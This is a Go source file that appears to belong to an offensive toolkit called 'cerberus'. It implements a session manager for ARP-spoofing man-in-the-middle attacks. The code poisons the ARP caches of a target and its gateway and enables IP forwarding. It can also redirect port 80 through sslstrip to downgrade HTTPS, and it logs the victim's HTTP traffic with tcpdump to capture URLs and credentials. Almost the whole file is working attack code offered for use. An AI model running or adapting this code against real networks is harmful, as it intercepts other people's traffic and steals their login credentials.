package mitm

import (
	"fmt"
	"log"
	"os"
	"os/exec"
	"sync"
	"time"
)

type Session struct {
	ID        string `json:"id"`
	TargetIP  string `json:"target_ip"`
	GatewayIP string `json:"gateway_ip"`
	Iface     string `json:"iface"`
	Running   bool   `json:"running"`
	StartedAt int64  `json:"started_at"`
	SSLStrip  bool   `json:"sslstrip"`
	Logging   bool   `json:"logging"`
	LogFile   string `json:"log_file"`
}

type Manager struct {
	sessions map[string]*sessionState
	mu       sync.RWMutex
}

type sessionState struct {
	session    Session
	arpTarget  *exec.Cmd
	arpGateway *exec.Cmd
	sslstrip   *exec.Cmd
	stop       chan struct{}
}

func NewManager() *Manager {
	return &Manager{
		sessions: make(map[string]*sessionState),
	}
}

// Start begins an ARP spoof MITM between target and gateway
func (m *Manager) Start(id, targetIP, gatewayIP, iface string, sslstrip bool) error {
	m.mu.Lock()
	defer m.mu.Unlock()

	if _, exists := m.sessions[id]; exists {
		return fmt.Errorf("session %s already running", id)
	}

	// Enable IP forwarding
	os.WriteFile("/proc/sys/net/ipv4/ip_forward", []byte("1"), 0644)

	logFile := fmt.Sprintf("/tmp/cerberus-mitm-%s.log", id)

	// ARP spoof: tell target we are the gateway
	cmdTarget := exec.Command("arpspoof", "-i", iface, "-t", targetIP, gatewayIP)

	// ARP spoof: tell gateway we are the target
	cmdGateway := exec.Command("arpspoof", "-i", iface, "-t", gatewayIP, targetIP)

	state := &sessionState{
		session: Session{
			ID:        id,
			TargetIP:  targetIP,
			GatewayIP: gatewayIP,
			Iface:     iface,
			Running:   true,
			StartedAt: time.Now().Unix(),
			SSLStrip:  sslstrip,
			Logging:   true,
			LogFile:   logFile,
		},
		arpTarget:  cmdTarget,
		arpGateway: cmdGateway,
		stop:       make(chan struct{}),
	}

	// Start ARP spoofing in both directions
	if err := cmdTarget.Start(); err != nil {
		return fmt.Errorf("arpspoof target: %w", err)
	}
	if err := cmdGateway.Start(); err != nil {
		cmdTarget.Process.Kill()
		return fmt.Errorf("arpspoof gateway: %w", err)
	}

	// Optional: start sslstrip for HTTP downgrade attacks
	if sslstrip {
		// Redirect HTTP traffic through sslstrip
		exec.Command("iptables", "-t", "nat", "-A", "PREROUTING",
			"-p", "tcp", "--destination-port", "80",
			"-j", "REDIRECT", "--to-port", "10000").Run()

		state.sslstrip = exec.Command("sslstrip", "-l", "10000", "-w", logFile)
		if err := state.sslstrip.Start(); err != nil {
			log.Printf("mitm: sslstrip failed to start: %v (continuing without)", err)
			state.session.SSLStrip = false
		}
	}

	// Start traffic logger (captures URLs, credentials from HTTP)
	go m.logTraffic(state)

	m.sessions[id] = state

	// Cleanup goroutine
	go func() {
		<-state.stop
		m.cleanup(state)
	}()

	log.Printf("mitm: started ARP spoof %s <-> %s on %s", targetIP, gatewayIP, iface)
	return nil
}

func (m *Manager) Stop(id string) error {
	m.mu.Lock()
	defer m.mu.Unlock()

	state, ok := m.sessions[id]
	if !ok {
		return fmt.Errorf("session %s not found", id)
	}

	if state.session.Running {
		close(state.stop)
		state.session.Running = false
	}
	return nil
}

func (m *Manager) StopAll() {
	m.mu.Lock()
	defer m.mu.Unlock()

	for _, state := range m.sessions {
		if state.session.Running {
			close(state.stop)
			state.session.Running = false
		}
	}
}

func (m *Manager) cleanup(state *sessionState) {
	if state.arpTarget.Process != nil {
		state.arpTarget.Process.Kill()
		state.arpTarget.Wait()
	}
	if state.arpGateway.Process != nil {
		state.arpGateway.Process.Kill()
		state.arpGateway.Wait()
	}
	if state.sslstrip != nil && state.sslstrip.Process != nil {
		state.sslstrip.Process.Kill()
		state.sslstrip.Wait()
		// Remove iptables redirect rule
		exec.Command("iptables", "-t", "nat", "-D", "PREROUTING",
			"-p", "tcp", "--destination-port", "80",
			"-j", "REDIRECT", "--to-port", "10000").Run()
	}

	log.Printf("mitm: stopped session %s", state.session.ID)
}

func (m *Manager) logTraffic(state *sessionState) {
	// Use tcpdump to log HTTP traffic passing through us
	logFile := state.session.LogFile
	if !state.session.SSLStrip {
		// If no sslstrip, log with tcpdump
		cmd := exec.Command("tcpdump",
			"-i", state.session.Iface,
			"-n",
			"-A",
			"host", state.session.TargetIP,
			"and", "port", "80",
		)

		f, err := os.Create(logFile)
		if err != nil {
			log.Printf("mitm: log file error: %v", err)
			return
		}
		defer f.Close()
		cmd.Stdout = f

		cmd.Start()

		<-state.stop
		if cmd.Process != nil {
			cmd.Process.Kill()
		}
	}
}

func (m *Manager) List() []Session {
	m.mu.RLock()
	defer m.mu.RUnlock()

	result := make([]Session, 0, len(m.sessions))
	for _, s := range m.sessions {
		result = append(result, s.session)
	}
	return result
}

func (m *Manager) Get(id string) (*Session, bool) {
	m.mu.RLock()
	defer m.mu.RUnlock()

	if s, ok := m.sessions[id]; ok {
		sess := s.session
		return &sess, true
	}
	return nil, false
}

func (m *Manager) Remove(id string) {
	m.mu.Lock()
	defer m.mu.Unlock()

	if s, ok := m.sessions[id]; ok {
		if s.session.Running {
			close(s.stop)
			m.cleanup(s)
		}
		delete(m.sessions, id)
	}
}

// GetLog returns the contents of a MITM session's traffic log
func (m *Manager) GetLog(id string) ([]byte, error) {
	m.mu.RLock()
	defer m.mu.RUnlock()

	state, ok := m.sessions[id]
	if !ok {
		return nil, fmt.Errorf("session %s not found", id)
	}

	return os.ReadFile(state.session.LogFile)
}
